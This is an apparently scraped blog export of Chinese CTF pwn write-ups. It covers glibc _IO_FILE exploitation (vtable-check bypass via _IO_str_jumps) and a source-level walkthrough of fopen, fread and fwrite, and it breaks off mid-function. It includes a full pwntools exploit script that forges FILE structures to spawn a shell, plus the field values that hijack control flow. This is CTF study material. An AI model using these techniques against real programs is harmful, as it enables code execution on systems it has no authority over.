ciscn_2019_n_7华北赛区的一道半决赛题 题目三个功能 add edit showadd只能使用一次，会将name 和 指针保存在堆中，且获取name的时候会有八个字节的溢出，刚好可以覆盖指针，edit会先修改name ，再根据保存的指针来修改内存值，所以可以任意地址写另：输入666可以得到puts的实际地址，因此可以泄露libc 方向666 泄露libc，add或edit来修改指针，原计划修改malloc_hook为onegadget，但是鉴于在add之后不再有malloc 或者free，因此不可行。很自然的想到修改IO_file 虚表来使程序退出时能够触发来getshell。 exp12 2.24 check 绕过前面已经知道从2.24开始添加了对虚表的检查，使得没有办法任意地址伪造vtable。所以有了一些不用伪造虚表的利用办法 _IO_buf_base &amp; _IO_buf_end再调用相关stdin的函数如——read , scanf等函数时，会对__IO_stdin 的 _IO_buf_base ,_IO_buf_end, _IO_read_ptr, _IO_read_base, _IO_read_end 进行初始化，因为底层调用的malloc，所以一般都会分配到堆里。 可以随便写个小程序测试下12345678910#include&lt;stdio.h&gt;int main()&#123; char *ptr = malloc(0x20); int a; scanf(&quot;%d&quot;,&amp;a); printf(&quot;%d&quot;,a); free(ptr); return 0;&#125; 加上调试符号编译，scanf过后，可以看到堆中添加了一个大小为0x411的chunk，这个chunk就是开辟的缓冲区 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960610x602000 FASTBIN &#123; prev_size = 0, size = 49, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x602030 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0xa363534333231, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x602440 PREV_INUSE &#123; prev_size = 0, size = 134081, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;&gt; p *(struct _IO_FILE_plus *) stdin$3 = &#123; file = &#123; _flags = -72539512, _IO_read_ptr = 0x602046 &quot;\\n&quot;, _IO_read_end = 0x602047 &quot;&quot;, _IO_read_base = 0x602040 &quot;123456\\n&quot;, _IO_write_base = 0x602040 &quot;123456\\n&quot;, _IO_write_ptr = 0x602040 &quot;123456\\n&quot;, _IO_write_end = 0x602040 &quot;123456\\n&quot;, _IO_buf_base = 0x602040 &quot;123456\\n&quot;, _IO_buf_end = 0x602440 &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dd7770 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd59a0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd2440 &lt;__GI__IO_file_jumps&gt;&#125; 例如我们在使用scanf对栈中的临时变量赋值时，作为缓冲区，数据也会在这边被同步保存，因而如果能够控制_IO_buf_base指针，就能够实现任意地址写。 同理printf等也会开辟输出缓冲区，通过修改也能够做到任意地址读。 _IO_str_jumpslibc不止有_IO_file_jumps这个虚表，还有_IO_str_jumps 与 _IO_wstr_jumps等虚表，一般前者更好利用所以将伪造的结构体vtable指针指向这个虚表，再对其进行利用 _IO_str_jumps 定义于/libio/strops.c中1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 一般可以利用_IO_str_finish 与 _IO_str_overflow，同时也是前者更方便利用，定义如下 12345678void_IO_str_finish (FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); # call qword ptr [fp+0E8h] fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; _IO_str_finish需要满足1234567_flags = (binsh_in_libc + 0x10) &amp; ~1_IO_buf_base = binsh_addr_freeres_list = 0x2_freeres_buf = 0x3_mode = -1vtable = _IO_str_finish - 0x18fp+0xe8 -&gt; system_addr 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int_IO_str_overflow (FILE *fp, int c)&#123; int flush_only = c == EOF; size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // step 1 return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = malloc (new_size); if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); free (old_buf); /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, &apos;\\0&apos;, new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) _IO_str_overflow需要满足12345678_flags = 0_IO_write_base = 0_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1_IO_buf_end = (binsh_in_libc_addr -100) / 2 _freeres_list = 0x2_freeres_buf = 0x3_mode = -1vtable = _IO_str_jumps - 0x18 利用实例2echo from your heart方向有点迷/尝试使用的fake_file2也没有成功，在unlink的时候就中断了。 _flags = 0_IO_write_base &lt; _IO_write_ptr_IO_buf_base = binsh_mode &lt;= 0vtable = _IO_str_jumps - 8fp+0xe8 -&gt; system_addr 题目基本上就是那个hctf中的printf，程序执行流基本一致 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python2# -*- coding:utf-8 -*-import sysfrom pwn import *#context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;./echo_from_your_heart&apos;) elf = ELF(&apos;./echo_from_your_heart&apos;) libc = ELF(&apos;/glibc/glibc-2.24/debug_x64/lib/libc-2.24.so&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;./echo_from_your_heart&apos;) #libc=ELF(&apos;&apos;)def get(size,word): sh.sendlineafter(&apos;word: &apos;,str(size)) sh.sendlineafter(&apos;word: &apos;,word)get(0x20,&quot;%lx.&quot;*8+&quot;%lx&quot;)sh.recvuntil(&apos;echo: &apos;)for i in range(8): sh.recvuntil(&apos;.&apos;)#print sh.recv()libc.base = int(&apos;0x&apos;+sh.recvuntil(&apos;\\n&apos;,drop=True),16) - 0x1fcc9print hex(libc.base)io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]system = libc.base + libc.symbols[&apos;system&apos;]binsh = libc.base + libc.search(&apos;/bin/sh\\x00&apos;).next()io_str_jumps = libc.base + libc.symbols[&apos;_IO_str_jumps&apos;]success(&quot;binsh_addr: &quot;+hex(binsh))#sh.recv()get(0x20,&apos;a&apos;*0x20+p64(0)+p64(0xfa1))get(0x1000,&apos;bbbb&apos;)#gdb.attach(sh)fake_file = p64(0)+p64(0x61)fake_file += p64(0)+p64(io_list_all-0x10) # read_end &amp; read_basefake_file += p64(2)+p64(3) # write_base &lt; write_ptrfake_file += p64(0)+p64(binsh) # write_end &amp; buf_basefake_file += &apos;\\0&apos;*0x98#fake_file.ljust(0xd8,&apos;\\0&apos;) # use ljust will be detected why?pay = fake_file pay += p64(io_str_jumps-8) # vtable_ptrpay += p64(0) + p64(system)fake_file2 = p64(0)+p64(0x61)fake_file2 += p64(0)*2fake_file2 += p64(0)+p64((binsh-100)/2+1) # write_base &amp; write_ptrfake_file2 += p64(0)*2fake_file2 += p64((binsh-100)/2) # buf_endfake_file2 += &apos;\\0&apos;*0x60fake_file2 += p64(2)+p64(3) # freeres_list &amp; freeres_buffake_file2 += p64(0)*0x20#gdb.attach(sh)pay2 = fake_file2pay2 += p64(io_str_jumps-0x18)get(0x10,&apos;d&apos; * 0x10 + pay)#gdb.attach(sh)#get(0x20,&apos;a&apos;*0x20+fake_file)sleep(1)sh.sendlineafter(&apos;word: &apos;,&apos;20&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"file","slug":"file","permalink":"http://siriuswhiter.tk/tags/file/"}]},{"title":"_IO_FILE 源码分析","slug":"io-file-源码分析","date":"2019-07-08T05:33:38.000Z","updated":"2019-07-11T11:04:39.864Z","comments":true,"path":"2019/07/08/io-file-源码分析/","link":"","permalink":"http://siriuswhiter.tk/2019/07/08/io-file-源码分析/","excerpt":"","text":"_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进 这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug symbol的glibc。源码与编译方式如下 123456789101112131415161718//gcc -Wl,-dynamic-linker /glibc/glibc-2.23/debug_x64/lib/ld-linux-x86-64.so.2 -o iofile -g iofile.c#include&lt;stdio.h&gt;int main()&#123; FILE*fp1=fopen(&quot;test1&quot;,&quot;wb+&quot;); char data1[20]; fread(data1,1,20,fp1); FILE*fp2=fopen(&quot;test2&quot;,&quot;wb&quot;); char data2[20]=&#123;&quot;abcdefghij1234567890&quot;&#125;; fwrite(data2,1,20,fp2); fclose(fp1); fclose(fp2); return 0; &#125; fopen框架malloc为结构体分配内存空间。 _IO_no_init 对FILE结构体进行初始化。 _IO_file_init将结构体链接进_IO_list_all链表。 _IO_file_fopen执行系统调用打开文件。 返回句柄。 细节fopen-&gt;_IO_new_fopen跟进去,发现是_IO_new_fopen函数，在libio/iofopen.c中。（这里展示的不是2.23的代码，所以与下面调试时的代码会有所偏差）12345FILE *_IO_new_fopen (const char *filename, const char *mode)&#123; return __fopen_internal (filename, mode, 1);&#125; 继续跟进__fopen_internal __fopen_internal123456789101112131415161718192021222324252627FILE *__fopen_internal (const char *filename, const char *mode, int is32)&#123; struct locked_FILE &#123; struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO _IO_lock_t lock;#endif struct _IO_wide_data wd; &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); if (new_f == NULL) return NULL;#ifdef _IO_MTSAFE_IO new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps); //对file结构体new_f进行初始化。 _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; // 设置vtable为_IO_file_jumps _IO_new_file_init_internal (&amp;new_f-&gt;fp); // 将file结构体链接进去_IO_list_all if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); _IO_un_link (&amp;new_f-&gt;fp); free (new_f); return NULL;&#125; 可以看到先申请了一个locked_FILE 结构体，其内部有三个结构体，分别为fp = _IO_FILE_plus,lock = _IO_lock_t,*wd = _IO_wide_data太大了就不贴出来了123456789pwndbg&gt; print new_f$3 = (struct locked_FILE *) 0x602010pwndbg&gt; x/20gx 0x602010-0x100x602000: 0x0000000000000000 0x00000000000002310x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x0000000000000000 _IO_no_init继续跟进,_IO_no_init 对file结构体进行初始化。这里2.23版本是这样的 12345#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);#else _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);#endif 进入函数内部，该函数位于/libio/genops.c中，开始时进入_IO_old_init (fp, flags)，对fp结构体部分初始化，绝大多数为空，返回后主要对fp-&gt;_wide_data结构体进行了初始化。 返回后设置vtable为_IO_file_jumps。 _IO_file_init继续运行，调用_IO_file_init (&amp;new_f-&gt;fp)，这里位于/libio/fileops.c; 将前面创建的file结构体放入_IO_list_all中。可以看到主体是调用的_IO_link_in(fp) 123456789101112void_IO_file_init (struct _IO_FILE_plus *fp)&#123; /* POSIX.1 allows another file handle to be used to change the position of our file descriptor. Hence we actually don&apos;t know the actual position before we do the first fseek (and until a following fflush). */ fp-&gt;file._offset = _IO_pos_BAD; fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS; _IO_link_in (fp); fp-&gt;file._fileno = -1;&#125; _IO_link_in跟进该函数,又回到了genops.c中，看到开始检查flag的标志位是否是_IO_LINKED，因为FILE结构体是通过_IO_list_all的单链表进行组织管理的，所以如果不在链表中便对其进行相应的处理，12345678910111213141516171819202122void_IO_link_in (struct _IO_FILE_plus *fp)&#123; if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0) &#123; fp-&gt;file._flags |= _IO_LINKED;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock); run_fp = (FILE *) fp; _IO_flockfile ((FILE *) fp);#endif fp-&gt;file._chain = (FILE *) _IO_list_all; _IO_list_all = fp;#ifdef _IO_MTSAFE_IO _IO_funlockfile ((FILE *) fp); run_fp = NULL; _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif &#125;&#125; 查看下_IO_list_all申请的结构体,即前面三个结构体中第一个结构体。1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; print *_IO_list_all$5 = &#123; file = &#123; _flags = -72538996, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, _fileno = -1, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;&quot;, _lock = 0x6020f0, _offset = -1, _codecvt = 0x0, _wide_data = 0x602100, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd46e0 &lt;__GI__IO_file_jumps&gt;&#125; 函数返回到__fopen_internal中，进入一个判断12if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); _IO_new_file_fopen跟进判断函数，跳转到了/libio/fileops.c中的_IO_new_file_fopen函数123FILE *_IO_new_file_fopen (FILE *fp, const char *filename, const char *mode, int is32not64) 前面先检查文件是否打开，之后设置打开模式，最后调用 _IO_file_open 12result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write, is32not64); _IO_file_open跟进_IO_file_open函数，可以看到，调用了系统级函数__open打开文件，之后设置fp-&gt;_fileno为文件描述符，最后再次调用_IO_link_in确保设置进入_IO_list_all。1234567891011121314151617181920212223242526272829FILE *_IO_file_open (FILE *fp, const char *filename, int posix_mode, int prot, int read_write, int is32not64)&#123; int fdesc; if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL)) fdesc = __open_nocancel (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); else fdesc = __open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); if (fdesc &lt; 0) return NULL; fp-&gt;_fileno = fdesc; _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING); /* For append mode, send the file offset to the end of the file. Don&apos;t update the offset cache though, since the file handle is not active. */ if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123; off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end); if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123; __close_nocancel (fdesc); return NULL; &#125; &#125; _IO_link_in ((struct _IO_FILE_plus *) fp); return fp;&#125; 之后返回之后调用了__fopen_maybe_mmap，之后将fp指针返回，整个流程就结束了。 fread框架如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区 根据输入缓冲区与目标缓冲区情况分别进行处理，底层调用read的系统调用来进行读取并复制 细节进入之前再查看下FILE结构体fp指针的内容1234567891011121314151617181920212223242526272829303132pwndbg&gt; print *fp$6 = &#123; _flags = -72539008, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, _fileno = 3, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;&quot;, _lock = 0x6020f0, _offset = -1, _codecvt = 0x0, _wide_data = 0x602100, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt;&#125; fread-&gt;_IO_fread跟进fread函数，看到是位于/libio/fread.c中的_IO_fread,看到先计算了请求字节数，之后对fp加锁，执行_IO_sgetn，之后释放锁。12345678910111213size_t_IO_fread (void *buf, size_t size, size_t count, FILE *fp)&#123; size_t bytes_requested = size * count; size_t bytes_read; CHECK_FILE (fp, 0); if (bytes_requested == 0) return 0; _IO_acquire_lock (fp); bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); _IO_release_lock (fp); return bytes_requested == bytes_read ? count : bytes_read / size;&#125; _IO_sgetn ==&gt; _IO_XSGETN可以看到主体应该是_IO_sgetn函数，跟进该函数,发现主体为_IO_XSGETN函数1234567size_t_IO_sgetn (FILE *fp, void *data, size_t n)&#123; /* FIXME handle putback buffer here! */ return _IO_XSGETN (fp, data, n);&#125;libc_hidden_def (_IO_sgetn) 查看定义1#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N) 继续跟进，进入/libio/fileops.c，该函数较长，做了不少事情。12size_t_IO_file_xsgetn (FILE *fp, void *data, size_t n) 如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区12345678910if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; 第一步：_IO_doallocbuf跟进_IO_doallocbuf,进入/libio/genops.c1234567891011void_IO_doallocbuf (FILE *fp)&#123; if (fp-&gt;_IO_buf_base) return; if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0) if (_IO_DOALLOCATE (fp) != EOF) return; _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;libc_hidden_def (_IO_doallocbuf) 这里重新回顾下开始时的结构体状态，这些变量未被初始化12345_IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_file_doallocate因此开始检验是否被初始化，如果已经初始化就返回。检查标志位之后调用vtable中的_IO_file_doallocate，由注释可以看到这个函数主要用来分配输入缓冲区。12345678910111213141516171819202122232425262728293031323334/* Allocate a file buffer, or switch to unbuffered I/O. Streams for TTY devices default to line buffered. */int_IO_file_doallocate (FILE *fp)&#123; size_t size; char *p; struct stat64 st; size = BUFSIZ; if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0) &#123; if (S_ISCHR (st.st_mode)) &#123; /* Possibly a tty. */ if (#ifdef DEV_TTY_P DEV_TTY_P (&amp;st) ||#endif local_isatty (fp-&gt;_fileno)) fp-&gt;_flags |= _IO_LINE_BUF; &#125;#if defined _STATBUF_ST_BLKSIZE if (st.st_blksize &gt; 0 &amp;&amp; st.st_blksize &lt; BUFSIZ) size = st.st_blksize;#endif &#125; p = malloc (size); if (__glibc_unlikely (p == NULL)) return EOF; _IO_setb (fp, p, p + size, 1); return 1;&#125;libc_hidden_def (_IO_file_doallocate) 首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的 __stat函数，获取文件信息，这里是通过_fxstat64来获取，其内部是通过系统调用来实现，之后对size进行设置。123456int_IO_file_stat (_IO_FILE *fp, void *st)&#123; return __fxstat64 (_STAT_VER, fp-&gt;_fileno, (struct stat64 *) st);&#125;libc_hidden_def (_IO_file_stat) 再之后通过malloc得到分配的缓冲区，再调用_IO_setb设置FILE缓冲区跟进_IO_setb,设置了_IO_buf_base和_IO_buf_end，还有_flags12345678910111213void_IO_setb (FILE *f, char *b, char *eb, int a)&#123; if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF)) free (f-&gt;_IO_buf_base); f-&gt;_IO_buf_base = b; f-&gt;_IO_buf_end = eb; if (a) f-&gt;_flags &amp;= ~_IO_USER_BUF; else f-&gt;_flags |= _IO_USER_BUF;&#125;libc_hidden_def (_IO_setb) 之后逐步返回到_IO_file_xsgetn 可以看到_IO_buf_base与_IO_buf_end都被设置了，大小为0x100012_IO_buf_base = 0x602240 &quot;&quot;, _IO_buf_end = 0x603240 &quot;&quot;, 第二步：123456789while (want &gt; 0) &#123; have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr; if (want &lt;= have) //如果缓冲区里有足够的字符，就直接将缓冲区里的字符复制到目标区 &#123; memcpy (s, fp-&gt;_IO_read_ptr, want); fp-&gt;_IO_read_ptr += want; want = 0; &#125; 第三步：12345678 else&#123; if (have &gt; 0) //如果缓冲区字符不够，就将其先复制到目标区 &#123; s = __mempcpy (s, fp-&gt;_IO_read_ptr, have); want -= have; fp-&gt;_IO_read_ptr += have; &#125; 第四步：__underflow因为是第一次读取数据，此时的fp-&gt;_IO_read_end以及fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow1234567891011/* If we now want less than a buffer, underflow and repeat the copy. Otherwise, _IO_SYSREAD directly to the user buffer. */ if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) //输入缓冲区不能满足需求，调用__underflow读入数据 &#123; if (__underflow (fp) == EOF) break; continue; &#125; 进入__underflow函数，位于/libio/genops.c1234567891011121314151617181920212223242526272829int__underflow (FILE *fp)&#123; if (_IO_vtable_offset (fp) == 0 &amp;&amp; _IO_fwide (fp, -1) != -1) return EOF; if (fp-&gt;_mode == 0) _IO_fwide (fp, -1); if (_IO_in_put_mode (fp)) if (_IO_switch_to_get_mode (fp) == EOF) return EOF; if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (_IO_in_backup (fp)) &#123; _IO_switch_to_main_get_area (fp); if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; &#125; if (_IO_have_markers (fp)) &#123; if (save_for_backup (fp, fp-&gt;_IO_read_end)) return EOF; &#125; else if (_IO_have_backup (fp)) _IO_free_backup_area (fp); return _IO_UNDERFLOW (fp);&#125;libc_hidden_def (__underflow) 可以看到经过一些检查之后会调用_IO_UNDERFLOW,跟进，调用了/libio/fileops.c中的12int_IO_new_file_underflow (FILE *fp) 检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 / Reading not allowed /。123456if (fp-&gt;_flags &amp; _IO_NO_READS) &#123; fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; 如果fp-&gt;_IO_buf_base为null，则调用_IO_doallocbuf分配输入缓冲区。和前面一样12345678910111213if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; 接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base1234fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; 调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。12count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); 设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。设置完之后通过while循环进入第二部分将输入缓冲区拷贝至目标缓冲区，流程结束，返回。 ray-cp大佬解释了下为什么最后在_IO_UNDERFLOW中又一次检查调用了_IO_doallocbuf分配输入缓冲区。因为虽然一般的输入底层都在调用__underflow函数，但是并非全部,scanf函数调用的是_u_flow函数，其内部并未提前分配缓冲区，之后也调用了_IO_UNDERFLOW函数，因此需要在这里进行缓冲区的分配。 fwrite框架主体是_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow建立刷新缓冲区，其中_IO_file_doallocate负责缓冲区的申请建立最后调用_IO_default_xsputn将剩余输出至输出缓冲区 细节fwrite-&gt;_IO_fwrite跟进，进入_IO_fwrite函数 12345678910111213141516171819202122size_t_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)&#123; size_t request = size * count; size_t written = 0; CHECK_FILE (fp, 0); if (request == 0) return 0; _IO_acquire_lock (fp); if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1) written = _IO_sputn (fp, (const char *) buf, request); _IO_release_lock (fp); /* We have written all of the input in case the return value indicates this or EOF is returned. The latter is a special case where we simply did not manage to flush the buffer. But the data is in the buffer and therefore written as far as fwrite is concerned. */ if (written == request || written == EOF) return count; else return written / size;&#125;libc_hidden_def (_IO_fwrite) _IO_sputn-&gt;_IO_new_file_xsputn可以看到前面的流程和fread相似，之后调用了主体函数_IO_sputn，跟进，进入了/libio/fileops.c中的_IO_new_file_xsputn1234567891011121314151617181920212223size_t_IO_new_file_xsputn (FILE *f, const void *data, size_t n).../* First figure out how much space is available in the buffer. */ if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; count = f-&gt;_IO_buf_end - 